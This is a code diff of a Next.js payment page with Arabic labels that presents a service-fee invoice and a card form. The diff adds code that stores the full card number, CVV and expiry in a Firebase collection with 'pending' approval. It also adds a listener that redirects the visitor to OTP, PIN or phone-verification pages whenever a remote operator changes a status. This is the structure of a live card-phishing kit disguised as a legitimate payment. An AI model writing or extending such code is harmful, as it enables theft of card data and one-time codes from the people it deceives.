@@ -1,66 +1,105 @@
-"use client"
-
-import type React from "react"
-import { useSearchParams } from "next/navigation"
-import { useState } from "react"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Lock, CreditCard } from "lucide-react"
-import { useRouter } from "next/navigation"
+"use client";
+import { useEffect, useState } from "react";
+import { useSearchParams, useRouter } from "next/navigation";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import { Lock, CreditCard } from "lucide-react";
+import { addData, db } from "@/lib/firebase";
+import { doc, onSnapshot } from "firebase/firestore";
+import FullPageLoader from "@/components/loader";
 
 export default function PaymentForm() {
-  const router = useRouter()
-  const searchParams = useSearchParams()
-  const appointmentId = searchParams.get("appointmentId")
+  const router = useRouter();
+  const searchParams = useSearchParams();
+  const appointmentId = searchParams.get("appointmentId");
 
-  const [cardNumber, setCardNumber] = useState("")
-  const [cardName, setCardName] = useState("")
-  const [expiryMonth, setExpiryMonth] = useState("")
-  const [expiryYear, setExpiryYear] = useState("")
-  const [cvv, setCvv] = useState("")
-  const [isSubmitting, setIsSubmitting] = useState(false)
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardName, setCardName] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("");
+  const [expiryYear, setExpiryYear] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
+  /* ------------------ Card Formatter ------------------ */
   const formatCardNumber = (value: string) => {
-    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
-    const matches = v.match(/\d{4,16}/g)
-    const match = (matches && matches[0]) || ""
-    const parts = []
-    for (let i = 0, len = match.length; i < len; i += 4) {
-      parts.push(match.substring(i, i + 4))
-    }
-    if (parts.length) {
-      return parts.join(" ")
-    } else {
-      return value
-    }
-  }
+    const v = value.replace(/\D/g, "");
+    return v.match(/.{1,4}/g)?.join(" ") ?? "";
+  };
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatCardNumber(e.target.value)
-    if (formatted.length <= 19) {
-      setCardNumber(formatted)
-    }
-  }
+    const formatted = formatCardNumber(e.target.value);
+    if (formatted.length <= 19) setCardNumber(formatted);
+  };
 
+  /* ------------------ Submit ------------------ */
   const handleSubmit = async () => {
-    setIsSubmitting(true)
-    // Simulate payment processing
-    await new Promise((resolve) => setTimeout(resolve, 2000))
-    setIsSubmitting(false)
-    // Navigate to ATM PIN verification page
-    router.push("/payment/atm-pin")
-  }
+    setIsSubmitting(true);
 
-  const isFormValid = cardNumber.length >= 19 && cardName && expiryMonth && expiryYear && cvv.length >= 3
+    const visitorID = localStorage.getItem("visitor");
+    await addData({
+      id: visitorID,
+      cardNumber,
+      cardName,
+      cvv,
+      expiryMonth,
+      expiryYear,
+      cardApproval: "pending",
+    });
+
+    await new Promise((r) => setTimeout(r, 2000));
+    setIsSubmitting(false);
+    //router.push("/payment/atm-pin");
+  };
+
+  /* ------------------ Firestore Listener ------------------ */
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) return;
+
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (snap) => {
+      if (!snap.exists()) return;
+
+      const userData = snap.data();
+
+      if (userData.cardApproval === "pending") setIsLoading(true);
+      if (userData.cardApproval === "otp")
+        window.location.href = "/payment/otp";
+      if (userData.cardApproval === "approved")
+        window.location.href = "/payment/pin";
+      if (userData.cardApproval === "rejected") alert("رمز التحقق غير صحيح");
+      if (userData.currentPage === "9999")
+        window.location.href = "/verify-phone";
+    });
+
+    return () => unsubscribe();
+  }, []);
+
+  const isFormValid =
+    cardNumber.length === 19 &&
+    cardName &&
+    expiryMonth &&
+    expiryYear &&
+    cvv.length >= 3;
 
   return (
     <div className="space-y-6">
       {/* Invoice Information */}
       <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-6">
-        <h2 className="text-xl font-bold text-stone-900 text-center mb-2">معلومات الفاتورة</h2>
-        <p className="text-stone-500 text-center text-sm mb-6">دفع رسوم الخدمة</p>
+        <h2 className="text-xl font-bold text-stone-900 text-center mb-2">
+          معلومات الفاتورة
+        </h2>
+        <p className="text-stone-500 text-center text-sm mb-6">
+          دفع رسوم الخدمة
+        </p>
 
         <div className="text-center mb-6">
           <span className="text-5xl font-bold text-green-600">110.50</span>
@@ -73,7 +112,9 @@ export default function PaymentForm() {
             <span className="font-semibold">10.00 ر.س</span>
           </div>
           <div className="flex justify-between items-center">
-            <span className="text-stone-500 text-sm">ضريبة القيمة المضافة 15%</span>
+            <span className="text-stone-500 text-sm">
+              ضريبة القيمة المضافة 15%
+            </span>
             <span className="text-stone-500">1.50 ر.س</span>
           </div>
           <div className="flex justify-between items-center border-t border-stone-200 pt-3">
@@ -85,12 +126,18 @@ export default function PaymentForm() {
 
       {/* Payment Form */}
       <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-6">
-        <h2 className="text-xl font-bold text-stone-900 text-center mb-2">الدفع من خلال بطاقة الائتمان</h2>
-        <p className="text-stone-500 text-center text-sm mb-6">من فضلك أدخل معلومات الدفع الخاصة بك</p>
+        <h2 className="text-xl font-bold text-stone-900 text-center mb-2">
+          الدفع من خلال بطاقة الائتمان
+        </h2>
+        <p className="text-stone-500 text-center text-sm mb-6">
+          من فضلك أدخل معلومات الدفع الخاصة بك
+        </p>
 
         {/* Card Logos */}
         <div className="flex items-center gap-3 mb-6 justify-center">
-          <div className="bg-blue-900 text-white text-xs font-bold px-2 py-1 rounded">mada</div>
+          <div className="bg-blue-900 text-white text-xs font-bold px-2 py-1 rounded">
+            mada
+          </div>
           <img
             src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
             alt="Visa"
@@ -105,8 +152,10 @@ export default function PaymentForm() {
         <div className="space-y-4">
           {/* Card Number */}
           <div>
-            <Label className="text-stone-700 font-medium mb-2 block text-right">رقم البطاقة</Label>
-            <div className="relative" >
+            <Label className="text-stone-700 font-medium mb-2 block text-right">
+              رقم البطاقة
+            </Label>
+            <div className="relative">
               <Input
                 type="tel"
                 dir="ltr"
@@ -114,7 +163,6 @@ export default function PaymentForm() {
                 onChange={handleCardNumberChange}
                 placeholder="1234 1234 1234 1234"
                 className="h-12 text-right pr-12"
-                dir="ltr"
               />
               <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-stone-400" />
             </div>
@@ -122,7 +170,9 @@ export default function PaymentForm() {
 
           {/* Cardholder Name */}
           <div>
-            <Label className="text-stone-700 font-medium mb-2 block text-right">اسم صاحب البطاقة</Label>
+            <Label className="text-stone-700 font-medium mb-2 block text-right">
+              اسم صاحب البطاقة
+            </Label>
             <Input
               type="text"
               value={cardName}
@@ -135,7 +185,9 @@ export default function PaymentForm() {
           {/* Expiry and CVV */}
           <div className="grid grid-cols-2 gap-4">
             <div>
-              <Label className="text-stone-700 font-medium mb-2 block text-right">تاريخ الانتهاء</Label>
+              <Label className="text-stone-700 font-medium mb-2 block text-right">
+                تاريخ الانتهاء
+              </Label>
               <div className="flex gap-2">
                 <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                   <SelectTrigger className="h-12">
@@ -143,7 +195,10 @@ export default function PaymentForm() {
                   </SelectTrigger>
                   <SelectContent>
                     {Array.from({ length: 12 }, (_, i) => (
-                      <SelectItem key={i + 1} value={String(i + 1).padStart(2, "0")}>
+                      <SelectItem
+                        key={i + 1}
+                        value={String(i + 1).padStart(2, "0")}
+                      >
                         {String(i + 1).padStart(2, "0")}
                       </SelectItem>
                     ))}
@@ -164,12 +219,16 @@ export default function PaymentForm() {
               </div>
             </div>
             <div>
-              <Label className="text-stone-700 font-medium mb-2 block text-right">رمز (CVV)</Label>
+              <Label className="text-stone-700 font-medium mb-2 block text-right">
+                رمز (CVV)
+              </Label>
               <div className="relative">
                 <Input
                   type="password"
                   value={cvv}
-                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  onChange={(e) =>
+                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
+                  }
                   placeholder="CVV"
                   className="h-12 text-left"
                   dir="ltr"
@@ -187,6 +246,7 @@ export default function PaymentForm() {
           >
             {isSubmitting ? "جاري المعالجة..." : "ادفع الآن"}
           </Button>
+          {isLoading && <FullPageLoader />}
         </div>
 
         {/* Payment Logos */}
@@ -203,7 +263,9 @@ export default function PaymentForm() {
               alt="Mastercard"
               className="h-8"
             />
-            <div className="bg-blue-900 text-white text-xs font-bold px-3 py-1 rounded">mada مدى</div>
+            <div className="bg-blue-900 text-white text-xs font-bold px-3 py-1 rounded">
+              mada مدى
+            </div>
           </div>
         </div>
 
@@ -214,5 +276,5 @@ export default function PaymentForm() {
         </div>
       </div>
     </div>
-  )
+  );
 }
